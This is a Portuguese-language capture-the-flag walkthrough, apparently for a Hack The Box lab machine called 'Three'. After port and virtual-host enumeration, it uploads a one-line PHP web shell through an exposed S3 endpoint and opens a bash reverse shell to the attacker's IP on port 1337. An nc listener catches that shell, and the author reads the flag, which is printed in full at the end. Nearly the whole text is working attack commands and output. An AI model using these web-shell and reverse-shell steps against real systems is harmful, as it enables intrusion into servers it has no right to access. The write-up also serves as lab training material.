Descobrindo o que está rodando na maquina:
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-07 21:12 -03
Nmap scan report for 10.129.27.56
Host is up (0.092s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.96 seconds
```

Adicionando o `thetoppers.htb` no hosts
```
┌──(viktsys㉿viktsys-vm-3)-[/opt]
└─$ echo "10.129.27.56 thetoppers.htb" | sudo tee -a /etc/hosts   
```

```
┌──(viktsys㉿viktsys-vm-3)-[/opt]
└─$ gobuster vhost -w /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u thetoppers.htb --append-domain
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://thetoppers.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.3
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/01/07 21:31:57 Starting gobuster in VHOST enumeration mode
===============================================================
Found: s3.thetoppers.htb Status: 404 [Size: 21]
```

Adicionando o `s3.thetoppers.htb` no hosts
```
┌──(viktsys㉿viktsys-vm-3)-[/opt]
└─$ echo "10.129.27.56 s3.thetoppers.htb" | sudo tee -a /etc/hosts   
```

Criando o caminho para uma shell reversa usando o arquivo `shell.php`
```
┌──(viktsys㉿viktsys-vm-3)-[~/htb/three]
└─$ echo '<?php system($_GET["cmd"]); ?>' > shell.php        
                                                                                                                                                        
┌──(viktsys㉿viktsys-vm-3)-[~/htb/three]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
upload: ./shell.php to s3://thetoppers.htb/shell.php             
                                                     
```

Lembrando qual o IP da nossa maquina
```
┌──(viktsys㉿viktsys-vm-3)-[~/htb/three]
└─$ ifconfig addres tun0                                                                

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.15.134  netmask 255.255.254.0  destination 10.10.15.134
        inet6 dead:beef:2::1184  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::7466:41c:b778:a064  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (Não Especificado)
        RX packets 40594  bytes 49842704 (47.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 32399  bytes 3116947 (2.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Código do `shell.sh`
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.15.134/1337 0>&1
```

Copiando o `shell.sh` para o servidor
```
┌──(viktsys㉿viktsys-vm-3)-[~/htb/three]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.sh s3://thetoppers.htb
upload: ./shell.sh to s3://thetoppers.htb/shell.sh                
                                                                                                                                                        
┌──(viktsys㉿viktsys-vm-3)-[~/htb/three]
└─$ nc -nvlp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.129.27.56.
Ncat: Connection from 10.129.27.56:37386.
bash: cannot set terminal process group (1574): Inappropriate ioctl for device
bash: no job control in this shell
```

Com a shell aberta
```
www-data@three:/var/www/html$ cat /var/www/flag.txt
cat /var/www/flag.txt
a980d###########################
www-data@three:/var/www/html$ 
```

Flag: `a980d99281a28d638ac68b9bf9453c2b`